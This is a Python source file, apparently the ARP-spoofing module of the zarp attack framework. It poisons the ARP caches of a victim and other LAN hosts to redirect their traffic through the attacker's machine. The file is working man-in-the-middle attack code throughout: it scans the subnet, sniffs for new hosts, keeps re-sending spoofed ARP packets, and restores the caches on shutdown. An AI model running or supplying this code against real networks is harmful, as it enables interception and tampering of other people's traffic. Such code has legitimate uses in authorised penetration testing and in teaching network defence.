import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from threading import Thread
from scapy.all import *
from util import Error, Msg, debug
from poison import Poison
from zoption import Zoption
import config
import socket
import fcntl
from multiprocessing.pool import ThreadPool


class arp(Poison):
    """ARP spoofing class
    """

    def __init__(self):
        super(arp, self).__init__('ARP Spoof')
        conf.verb = 0
        # tuples (ip,mac)
        self.local = (config.get('ip_addr'), get_if_hwaddr(config.get('iface')))
        self.victim = ()
        self.targets = {}
        self.raw_netmask = None
        self.sample_int = None
        self.config.update({"to_ip": Zoption(value=None,
                                             type="ip",
                                             required=True,
                                             display="Target to poison"),
                            "from_ip": Zoption(value=None,
                                               type="ip or ipmask",
                                               required=False,
                                               display="Address or addresses to spoof from target"),
                            "respoof": Zoption(value=2,
                                               type="int",
                                               required=False,
                                               display="Interval to send respoofed packets")
                            })
        self.info = """
                    The heart and soul of zarp.  This module exploits the ARP
                    protocol to redirect all traffic through the attacker's 
                    chosen system. 

                    http://en.wikipedia.org/wiki/ARP_poison
                    """

    def cidr_to_ip_and_netmask(self, cidr):
        ip = cidr.split("/")[0]
        bit_count = int(cidr.split("/")[1])
        full = struct.unpack("!L", "\xff\xff\xff\xff")[0]
        netmask = socket.inet_ntoa(struct.pack('!L', (full << (32 - bit_count)) & full))
        return ip, netmask

    def get_iface_netmask(self):
        return socket.inet_ntoa(fcntl.ioctl(socket.socket(socket.AF_INET, socket.SOCK_DGRAM), 35099,
                                            struct.pack('256s', config.get('iface')))[20:24])

    def enumerate_all_ips_in_network(self, sample_ip, netmask):
        self.sample_int = struct.unpack("!L", socket.inet_aton(sample_ip))[0]
        self.raw_netmask = struct.unpack("!L", socket.inet_aton(netmask))[0]

        yield sample_ip

        # Going down
        test_int = self.sample_int - 1
        while True:
            if (self.sample_int & self.raw_netmask) == (test_int & self.raw_netmask):
                yield socket.inet_ntoa(struct.pack('!L', test_int))
                test_int -= 1
            else:
                break

        # Going up
        test_int = self.sample_int + 1
        while True:
            if (self.sample_int & self.raw_netmask) == (test_int & self.raw_netmask):
                yield socket.inet_ntoa(struct.pack('!L', test_int))
                test_int += 1
            else:
                break

    @staticmethod
    def get_mac_address_for_ip(ip):
        return ip, getmacbyip(ip)

    def initialize(self):
        """Initialize the ARP spoofer
        """
        self.victim = (self.config['to_ip'].value, getmacbyip(self.config['to_ip'].value))

        if self.config['from_ip'].value is None:
            # Enumerate all IPs in network
            Msg("Gathering information on network...this may take a minute")
            thread_pool = ThreadPool(processes=25)
            ip_whitelist = {self.victim[0], self.local[0]}
            for ip, mac in thread_pool.imap_unordered(arp.get_mac_address_for_ip,
                                                      (ip for ip in self.enumerate_all_ips_in_network(
                                                              self.config['to_ip'].value, self.get_iface_netmask()))):
                if ip in ip_whitelist:
                    continue

                if mac is None or mac == "ff:ff:ff:ff:ff:ff":
                    # no mac for you, next!
                    continue

                self.targets[ip] = mac
                # todo Consider adding an upper limit on hosts being poisoned
        elif "/" in self.config['from_ip'].value:
            source_ip, netmask = self.cidr_to_ip_and_netmask(self.config['from_ip'].value)
            # Enumerate all IPs in network
            Msg("Gathering information on network...this may take a minute")
            thread_pool = ThreadPool(processes=25)
            ip_whitelist = {self.victim[0], self.local[0]}
            for ip, mac in thread_pool.imap_unordered(arp.get_mac_address_for_ip, (ip for ip in
                                                                                   self.enumerate_all_ips_in_network(
                                                                                           source_ip, netmask))):
                if ip in ip_whitelist:
                    continue

                if mac is None or mac == "ff:ff:ff:ff:ff:ff":
                    # no mac for you, next!
                    continue

                self.targets[ip] = mac
                # todo Consider adding an upper limit on hosts being poisoned
        else:
            self.targets[self.config['from_ip'].value] = getmacbyip(self.config['from_ip'].value)
        Msg("Initializing ARP poison...")
        return self.initialize_post_spoof()

    def handle_ip_packet(self, pkt):
        try:
            if IP in pkt and Ether in pkt:
                ip = pkt[IP].src
                mac = pkt[Ether].src
                if ip not in self.targets and mac != "ff:ff:ff:ff:ff:ff" and ip != self.local[0] \
                        and ip != self.victim[0] and ip != "0.0.0.0":
                    raw_ip = struct.unpack("!L", socket.inet_aton(ip))[0]
                    if (self.sample_int & self.raw_netmask) == (raw_ip & self.raw_netmask):
                        self.targets[ip] = mac
                        target = (ip, mac)
                        Msg("Poisoning {0} <---> {1}".format(self.victim[0], target[0]))
                        victim_thread = Thread(target=self.respoofer, args=(target, self.victim))
                        victim_thread.daemon = True
                        victim_thread.start()
                        # send ARP replies to spoofed address
                        target_thread = Thread(target=self.respoofer, args=(self.victim, target))
                        target_thread.daemon = True
                        target_thread.start()
            if ARP in pkt and Ether in pkt and pkt[ARP].op in (1, 2):
                ip = pkt[ARP].psrc
                mac = pkt[Ether].src
                if ip not in self.targets and mac != "ff:ff:ff:ff:ff:ff" and ip != self.local[0] \
                        and ip != self.victim[0] and ip != "0.0.0.0":
                    raw_ip = struct.unpack("!L", socket.inet_aton(ip))[0]
                    if (self.sample_int & self.raw_netmask) == (raw_ip & self.raw_netmask):
                        self.targets[ip] = mac
                        target = (ip, mac)
                        Msg("Poisoning {0} <---> {1}".format(self.victim[0], target[0]))
                        victim_thread = Thread(target=self.respoofer, args=(target, self.victim))
                        victim_thread.daemon = True
                        victim_thread.start()
                        # send ARP replies to spoofed address
                        target_thread = Thread(target=self.respoofer, args=(self.victim, target))
                        target_thread.daemon = True
                        target_thread.start()

        except Exception, j:
            Error('Error with ARP poisoner: %s' % j)
            self.running = False

    def sniffer_thread(self):
        sniff(prn=self.handle_ip_packet, filter="ip or arp", store=0)

    def initialize_post_spoof(self):
        """ Separated from mainline initialization so we can run this post-var
            configuration.  If you're calling this, BE SURE to set up the required
            variables first!
        """
        try:
            if self.config['from_ip'].value is None or "/" in self.config['from_ip'].value:
                sniff_thread = Thread(target=self.sniffer_thread)
                sniff_thread.daemon = True
                sniff_thread.start()

            # send ARP replies to victim
            debug('Beginning ARP spoof to victim...')
            self.running = True
            for key in self.targets.keys():
                target = (key, self.targets[key])
                Msg("Poisoning {0} <---> {1}".format(self.victim[0], target[0]))
                victim_thread = Thread(target=self.respoofer, args=(target, self.victim))
                victim_thread.daemon = True
                victim_thread.start()
                # send ARP replies to spoofed address
                target_thread = Thread(target=self.respoofer, args=(self.victim, target))
                target_thread.daemon = True
                target_thread.start()
        except KeyboardInterrupt:
            Msg('Closing ARP poison down...')
            self.running = False
            return None
        except TypeError, t:
            Error('Type error: %s' % t)
            self.running = False
            return None
        except Exception, j:
            Error('Error with ARP poisoner: %s' % j)
            self.running = False
            return None
        return self.victim[0]

    def respoofer(self, target, victim):
        """ Respoof the target every two seconds.
        """
        try:
            pkt = Ether(dst=target[1], src=self.local[1])
            pkt /= ARP(op="who-has", psrc=victim[0], pdst=target[0])
            while self.running:
                sendp(pkt, iface_hint=target[0])
                time.sleep(self.config['respoof'].value)
        except Exception, j:
            Error('Spoofer error: %s' % j)
            return None

    def shutdown(self):
        """ Shutdown the ARP spoofer
        """
        if not self.running:
            return
        Msg("Initiating ARP shutdown...")
        debug('initiating ARP shutdown')
        self.running = False
        time.sleep(2)  # give it a sec for the respoofer
        # rectify the ARP caches
        for target in self.targets:
            sendp(
                Ether(dst=self.victim[1], src=target[1]) / ARP(op='who-has', psrc=target[0], pdst=self.victim[0]),
                count=1)
            sendp(
                Ether(dst=target[1], src=self.victim[1]) / ARP(op='who-has', psrc=self.victim[0], pdst=target[0]),
                count=1)
        debug('ARP shutdown complete.')
        return True

    def session_view(self):
        """ Return the IP we're poisoning
        """
        return self.victim[0]

    def view(self):
        """ ARP poisoner doesnt have a view, yet.
        """
        Msg('No view for ARP poison.  Enable a sniffer for detailed analysis.')
        return
